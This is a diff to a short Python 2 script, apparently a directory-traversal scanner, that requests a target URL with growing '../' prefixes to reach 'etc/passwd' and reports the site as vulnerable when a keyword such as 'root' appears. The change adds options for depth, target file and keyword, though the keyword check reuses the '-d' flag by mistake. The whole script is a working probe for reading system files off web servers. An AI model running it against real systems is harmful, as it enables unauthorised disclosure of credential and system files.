@@ -4,19 +4,20 @@ import getopt
 import time
 
 target = ''
-depth = 10
+depth = 6
 file = 'etc/passwd'
 
 html = ''
 prefix = ''
 url = ''
+keyword='root'
 
 def usage():
 		print "usage function"
 
 
 try:
-		opts,args = getopt.getopt(sys.argv[1:],"ht:",["help","target="])
+		opts,args = getopt.getopt(sys.argv[1:],"ht:d:f:k:",["help","target=","depth=","file=","keyword="])
 		for opt, arg in opts:
 			if opt in("-h","--help"):
 				usage()
@@ -25,12 +26,21 @@ try:
 				target = arg
 				if not target.startswith('http://', 0, 7): 
 						target = 'http://' + target
+			if opt in("-d","--depth"):
+				depth = int(arg)
+			if opt in("-f","--file"):
+				file = arg
+				if file.startswith('/',0,1):
+					file =file[1:]	
+			if opt in("-d","--keyword"):
+				keyword = arg
+
 except getopt.GetoptError:
 		usage()
 		sys.exit(2)
 
 
-for i in range(1,depth+1):
+for i in range(0,depth):
 		prefix += '../'
 		url = target + prefix + file
 		print "Testing: ",url
@@ -39,7 +49,7 @@ for i in range(1,depth+1):
 				html = response.read()
 		except:
 				pass
-		if("root" in html):
+		if(keyword in html):
 				print url, " is Vulnerable"
 				break
 		else:
